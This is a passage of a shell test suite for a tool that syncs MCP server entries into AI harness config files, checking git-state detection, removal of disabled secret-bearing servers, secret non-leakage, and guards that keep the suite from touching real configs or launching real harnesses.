printf '#!/bin/sh\necho "fatal: not a git repository (or any of the parent directories): .git" >&2\nexit 128\n' > "$FG/b/git"
chmod +x "$FG/a/git" "$FG/b/git"
GS="$(python3 - "$BIN" "$FG" "$HOME/.hnog/mcp.json" <<'PY2'
import importlib.machinery,importlib.util,os,sys
_l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
base=os.environ["PATH"]; out=[]
for sub in ("a","b"):
    os.environ["PATH"]=os.path.join(sys.argv[2],sub)+os.pathsep+base
    out.append(str(m.git_state(sys.argv[3])))
os.environ["PATH"]=sys.argv[2]+"/none"
out.append(str(m.git_state(sys.argv[3])))
print(" ".join(out), m.git_leak_risk("unknown"))
PY2
)"
eq "unknown None unknown True" "$GS" '#4100510415: erroring git -> unknown; "not a git repository" -> None; git missing -> unknown (a leak risk)'
rm -f "$REG/hnog.yaml"

# 4100510423 (P1): disabled + git-unsafe secret-bearing server is removed (owned) or a conflict (unmanaged),
# never a silent skip that leaves it active
SD8D="$T/state-r8d"
mk hdgt json mcpServers mcpservers-json "~/.hdgt/mcp.json" true disabled null high
printf '{"mcpServers":{}}' > "$HOME/.hdgt/mcp.json"
printf '{"schema":1,"servers":{"sdg":{"transport":"stdio","command":"npx","args":["-y","pkg"],"env":{"K":"${FIXSECRET}"}}}}\n' > "$T/ssot-dg-on.json"
printf '{"schema":1,"servers":{"sdg":{"transport":"stdio","command":"npx","args":["-y","pkg"],"env":{"K":"${FIXSECRET}"},"enabled":false}}}\n' > "$T/ssot-dg-off.json"
run_d8() { o="$("$BIN" "$@" --harness hdgt --registry "$REG" --state-dir "$SD8D" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
run_d8 apply --ssot "$T/ssot-dg-on.json"
eq 0 "$rc" '#4100510423: owned secret-bearing server applied outside git'
git -C "$HOME/.hdgt" init -q >/dev/null 2>&1; git -C "$HOME/.hdgt" add mcp.json >/dev/null 2>&1
git -C "$HOME/.hdgt" -c user.email=t@t -c user.name=t commit -qm t >/dev/null 2>&1
run_d8 apply --ssot "$T/ssot-dg-off.json"
has 'remove' "$o" '#4100510423: disabled + git-unsafe owned server -> remove action (not skip)'
eq 0 "$rc" '#4100510423: the removal apply exits 0'
GONE="$(python3 -c 'import json,sys; print("sdg" not in json.load(open(sys.argv[1]))["mcpServers"])' "$HOME/.hdgt/mcp.json")"
eq True "$GONE" '#4100510423: owned disabled server removed from the tracked config (not left active)'
run_d8 verify --ssot "$T/ssot-dg-off.json"
eq 0 "$rc" '#4100510423: verify clean after the removal'
# unmanaged entry in a tracked file -> conflict, non-zero, untouched
mk hdgu json mcpServers mcpservers-json "~/.hdgu/mcp.json" true disabled null high
printf '{"mcpServers":{"sdg":{"command":"npx","args":["-y","pkg"],"env":{"K":"hand"}}}}' > "$HOME/.hdgu/mcp.json"
git -C "$HOME/.hdgu" init -q >/dev/null 2>&1; git -C "$HOME/.hdgu" add mcp.json >/dev/null 2>&1
git -C "$HOME/.hdgu" -c user.email=t@t -c user.name=t commit -qm t >/dev/null 2>&1
MU="$(sum "$HOME/.hdgu/mcp.json")"
o="$("$BIN" apply --ssot "$T/ssot-dg-off.json" --harness hdgu --registry "$REG" --state-dir "$SD8D" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
has 'conflict' "$o" '#4100510423: unmanaged active entry, disabled in SSOT, git-unsafe -> conflict'
[ "$rc" -ne 0 ] && ok '#4100510423: conflict exits non-zero' || no '#4100510423: conflict exits non-zero' "rc=$rc"
eq "$MU" "$(sum "$HOME/.hdgu/mcp.json")" '#4100510423: unmanaged entry left untouched'
rm -f "$REG/hdgt.yaml" "$REG/hdgu.yaml"

# ---------------------------------------------------------------- global invariants
if grep -q "$FIXSECRET" "$ALLOUT"; then no 'fixture secret never printed (all modes)' "$(grep -c "$FIXSECRET" "$ALLOUT") hits"; else ok 'fixture secret never printed (all modes)'; fi
OUTSIDE="$(python3 - "$T" "$ALLOUT" <<'PY'
import re,sys
import os
root=os.path.realpath(sys.argv[1]); txt=open(sys.argv[2]).read()
print(" ".join(sorted({f for f in re.findall(r'"file": "([^"]+)"', txt) if not f.startswith(root)})))
PY
)"
eq "" "$OUTSIDE" 'every file the tool reported touching is inside the temp root'
# 4096987733 (P1): a managed entry that becomes un-renderable (skip) is preserved, not deleted
mk hkeep json mcpServers mcpservers-json "~/.hkeep/mcp.json" true null null high
mkdir -p "$HOME/.hkeep"
run apply --ssot "$SSOT" --harness hkeep --json
eq 0 "$rc" '#4096987733: initial apply with header support'
K0="$(python3 -c 'import json,sys; print("cf-remote" in json.load(open(sys.argv[1]))["mcpServers"])' "$HOME/.hkeep/mcp.json")"
eq True "$K0" '#4096987733: cf-remote written while headers are supported'
mk hkeep json mcpServers mcpservers-json "~/.hkeep/mcp.json" false null null high   # now: no header support
run plan --ssot "$SSOT" --harness hkeep --json
has 'lacks header support' "$o" '#4096987733: cf-remote now skipped (headers unsupported)'
# Instrument must be able to fail: print the cf-remote action list, or PARSE-ERROR (never an empty pass).
KA="$(printf '%s' "$o" | python3 -c 'import json,sys
try:
    d=json.load(sys.stdin); hs=d["harnesses"] if isinstance(d,dict) else d; print(" ".join(sorted(a["action"] for h in hs for a in h["actions"] if a["server"]=="cf-remote")) or "NONE")
except Exception as e:
    print("PARSE-ERROR", type(e).__name__)' 2>&1)"
eq "skip" "$KA" '#4096987733: skipped managed entry is NOT scheduled for removal (action list = skip only)'
run apply --ssot "$SSOT" --harness hkeep --json
K1="$(python3 -c 'import json,sys; print("cf-remote" in json.load(open(sys.argv[1]))["mcpServers"])' "$HOME/.hkeep/mcp.json")"
eq True "$K1" '#4096987733: apply preserves the still-working skipped entry'

# 4096987739 (P2): YAML comment detection is quote-aware
YC="$(python3 - "$BIN" <<'PY'
import importlib.machinery,sys
import importlib.util; _l=importlib.machinery.SourceFileLoader("hms",sys.argv[1]); m=importlib.util.module_from_spec(importlib.util.spec_from_loader("hms",_l)); _l.exec_module(m)
cases=[('theme: "dark" # keep\n',True),("theme: 'dark' # keep\n",True),("# top\n",True),
       ('url: "a#b"\n',False),("k: 'it''s #not'\n",False),("k: plain#tag\n",False),("k: it's fine\n",False)]
print(" ".join(str(m.yaml_has_comments(t)==want) for t,want in cases))
PY
)"
eq "True True True True True True True" "$YC" '#4096987739: yaml_has_comments quote-aware (7 cases)'
printf 'theme: "dark" # keep\nextensions: {}\n' > "$HOME/.hgoose/config.yaml"
G0="$(sum "$HOME/.hgoose/config.yaml")"
run apply --ssot "$SSOT" --harness hgoose
has 'allow-comment-loss' "$o" '#4096987739: goose comment after quoted scalar -> refused without the flag'
eq "$G0" "$(sum "$HOME/.hgoose/config.yaml")" '#4096987739: commented goose config left untouched'

# CodeRabbit 5308662091: an OWNED legacy entry survives while its replacement is skipped
mk hrepl json mcpServers mcpservers-json "~/.hrepl/mcp.json" false null null high   # no header support
mkdir -p "$HOME/.hrepl"
printf '{"schema":1,"servers":{"oldr":{"transport":"stdio","command":"npx","args":["old-tool"]}}}' > "$T/ssot-rep1.json"
printf '{"schema":1,"servers":{"newr":{"transport":"streamable-http","url":"https://mcp.example.test/new","headers":{"Authorization":"Bearer ${FIXSECRET}"},"replaces":["oldr"]}}}' > "$T/ssot-rep2.json"
run apply --ssot "$T/ssot-rep1.json" --harness hrepl --json
eq 0 "$rc" 'CR-5308662091: legacy oldr applied and owned'
run plan --ssot "$T/ssot-rep2.json" --harness hrepl --json
RA="$(printf '%s' "$o" | python3 -c 'import json,sys
try:
    d=json.load(sys.stdin); hs=d["harnesses"] if isinstance(d,dict) else d
    print(" ".join(sorted("%s=%s"%(a["server"],a["action"]) for h in hs for a in h["actions"])) or "NONE")
except Exception as e:
    print("PARSE-ERROR", type(e).__name__)' 2>&1)"
eq "newr=skip" "$RA" 'CR-5308662091: replacement skipped -> owned legacy NOT scheduled for removal'
run apply --ssot "$T/ssot-rep2.json" --harness hrepl --json
RK="$(python3 -c 'import json,sys; print(sorted(json.load(open(sys.argv[1]))["mcpServers"]))' "$HOME/.hrepl/mcp.json")"
eq "['oldr']" "$RK" 'CR-5308662091: apply keeps the working legacy entry (harness never left empty)'

# Suite self-guard: running this suite against ANY revision can never launch a real AI harness.
BAD=""
for n in $HARNESS_STUB_NAMES; do
  [ "$(command -v "$n")" = "$FIXBIN/$n" ] || [ "$(command -v "$n")" = "$STUBS/$n" ] || BAD="$BAD $n"
done
eq "" "$BAD" 'suite guard: every AI harness name resolves to a suite stub, never a real binary'
eq 0 "$MAOS_SELFHEAL" 'suite guard: MAOS_SELFHEAL=0 exported for the whole suite'
: > "$STUBLOG"; claude -p probe >/dev/null 2>&1; rc=$?
eq 1 "$rc" 'suite guard: an accidental harness call fails fast (stub exits 1)'
has 'claude -p probe' "$(cat "$STUBLOG")" 'suite guard: the accidental call is recorded, not executed'
CHG=""
while read -r f s; do [ "$(sum "$f")" = "$s" ] || CHG="$CHG $f"; done < "$REAL_SNAP"
eq "" "$CHG" 'no real (non-temp) config file changed'

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
